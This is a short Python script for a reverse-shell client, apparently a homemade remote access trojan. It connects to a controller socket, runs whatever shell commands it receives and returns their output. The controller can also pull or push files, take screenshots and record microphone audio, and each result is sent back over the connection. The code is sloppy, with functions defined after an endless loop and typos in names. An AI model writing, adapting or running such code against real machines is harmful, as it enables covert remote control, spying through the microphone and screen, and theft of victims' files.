import socket 
import subprocess 
import os
import pyautogui
import pyaudio
import wave


port = 1234
host = '127.0.0.1'
s = socket.socket()
s.connect((host,port))

while True:
        get_resp = s.recv(2048).lower().decode()
        if get_resp=="break":
            break
        elif get_resp.startswith("cd "):
            os.chdir(str(get_resp[3:]))
            s.send(os.getcwd().encode())
        else:
            output=subprocess.getoutput(get_resp)
            s.send(output.encode())
            

def file_upload():
    print("done bro")
    fielanme=s.recv(2048).decode()
    file=open(fielanme,"wb")
    image_chunk=s.recv(2048)
    while image_chunk:
        file.write(image_chunk)
        image_chunk=s.recv(2048)
        file.close()

def file_download():
    fielanme=s.recv(1024).decode()
    file=open(fielanme,"rb")
    image_data=file.read(2024)
    while image_data:
        s.send(image_data)
        image_data=file.read(2024)

def voice_recod():
    print("starting now reoding")
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 30
    WAVE_OUTPUT_FILENAME = "output.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    with open(WAVE_OUTPUT_FILENAME, 'rb') as f:
        for l in f:s.sendall(l)
        s.close()



     


revsiv=s.recv(1024).decode("UTF-8")
if revsiv=="1":
    file_upload()
elif revsiv=="2":
    file_download()
elif revsiv=="3":
    im1 = pyautogui.screenshot()
    im1.save(r"screenshot.png") 
    pic=open("screenshot.png","rb")
    data_img=pic.read(1024)
    while data_img:
        s.send(data_img)
        data_img=pic.read(1024)   
elif revsiv=="4":
    voice_recod()


